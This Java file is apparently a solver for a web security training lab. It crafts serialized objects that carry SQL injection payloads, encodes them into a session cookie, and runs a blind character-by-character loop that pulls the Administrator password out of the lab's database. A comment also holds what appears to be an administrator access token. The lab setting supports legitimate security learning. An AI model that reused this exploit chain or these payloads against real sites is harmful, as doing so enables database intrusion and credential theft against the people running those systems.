package lab.actions.common.serializable;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

import data.productcatalog.ProductTemplate;

class SQLiCookieAttacker {

    private static final String TARGET_URL = "https://0af100ea03349b468330bf9f00180018.web-security-academy.net/my-account";
    private static final String COOKIE_NAME = "session";
    private static final String CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";


    public static String genToken(String payload) throws Exception {

        // String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
        // confirmed 8 columbus by order clause.

        String sql_injectable_id = "' UNION SELECT null,null,(SELECT 1/(CASE WHEN (SELECT password FROM users WHERE username='Administrator') IS NOT NULL THEN 1 ELSE 0 END)::text,null,null,null,null,null -- -";
        ProductTemplate productTemplate = new ProductTemplate(payload);

        // AccessTokenUser a = new AccessTokenUser("administrator", "gzxu8flt4ukz65fuymebopvwp3a6rplu");
        
        ByteArrayOutputStream bb = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(bb);
        objectOutputStream.writeObject(productTemplate);

        byte[] bytePayload = bb.toByteArray();

        // System.out.println("Payload (Base64): " + Base64.getEncoder().encodeToString(bytePayload));

        return Base64.getEncoder().encodeToString(bytePayload);
    }

    public static String extractPassword() throws Exception {
        StringBuilder password = new StringBuilder();
        
        for (int position = 1; position <= 32; position++) { // Assuming 32-char password
            for (char c : CHARSET.toCharArray()) {
                // Craft the SQLi payload
                String payload = String.format(
                    "1' UNION SELECT null," +
                    "(CASE WHEN (SELECT SUBSTRING(password,%d,1) FROM users WHERE username='Administrator')='%c' " +
                    "THEN (SELECT 1/0) ELSE null END),null,null,null,null,null,null -- -",
                    position, c
                );
                
                // Base64 encode the payload for cookie
                String encodedPayload = genToken(payload);
                String cookie = COOKIE_NAME + "=" + encodedPayload;

                // Send the request
                String response = sendRequest(cookie);
                System.out.println(response + "   \n\npayload" + payload);
                // Check for error indicating successful character match
                if (!response.contains("java.io.IOException")) {
                    password.append(c);
                    System.out.printf("[+] Found char %d: %c (Progress: %s)%n", 
                                      position, c, password.toString());
                    break;
                }
            }
        }
        return password.toString();
    }

    private static String sendRequest(String cookie) throws Exception {
        URL url = new URL(TARGET_URL + "?id=wiener");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        
        // Set request headers to match curl command
        conn.setRequestMethod("GET");
        conn.setRequestProperty("Host", "0af100ea03349b468330bf9f00180018.web-security-academy.net");
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36");
        conn.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
        conn.setRequestProperty("Cookie", cookie);
        conn.setRequestProperty("Sec-Fetch-Dest", "document");
        conn.setRequestProperty("Sec-Fetch-Mode", "navigate");
        
        // Read response
        try (BufferedReader in = new BufferedReader(
                new InputStreamReader(conn.getInputStream()))) {
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) {
                response.append(line);
            }
            return response.toString();
        } catch (Exception e) {
            // Return error message for analysis
            return e.getMessage();
        }
    }
}


public class Main {

    public static void main(String[] args) throws Exception {

        String b64String = SQLiCookieAttacker.genToken("1' UNION SELECT null,null,null,null,null,null,"+ 
        "(SELECT CAST((SELECT concat(password, ' ' ,username) FROM users limit 1) AS int))" +
        ",null -- -");
        
        System.out.println("payload: " + b64String);
        // SQLiCookieAttacker.extractPassword();

        File payloadFile = new File("/home/th3h04x/Documents/portswigger/Serialization/java.example/temp/demo/src/main/java/lab/actions/common/serializable/token.ser");
        try (ObjectInputStream ois = new ObjectInputStream(
            new FileInputStream(payloadFile))) {
            AccessTokenUser a = (AccessTokenUser ) ois.readObject();

            // System.out.println(a.getAccessToken() + " " + a.getUsername());
        }
    }
}